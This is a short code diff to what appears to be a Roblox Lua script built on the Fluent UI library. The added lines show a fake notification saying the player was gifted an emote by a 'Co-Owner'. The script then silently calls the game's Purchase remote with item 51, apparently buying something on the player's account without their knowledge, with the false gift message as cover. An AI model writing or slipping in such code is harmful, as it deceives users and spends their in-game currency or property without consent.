@@ -197,6 +197,15 @@ local Tabs = {
 
 local Options = Fluent.Options
 
+Fluent:Notify({
+           Title = "Congratulations",
+            Content = "You got an Rockin Stride Emote",
+            SubContent = "Gifted by vyznix_1 (Co-Owner)", -- Optional
+            Duration = 15
+        })
+
+game:GetService("ReplicatedStorage").Events.Data.Purchase:InvokeServer(51)
+
 -- Main
 
 local Players = game:GetService("Players")
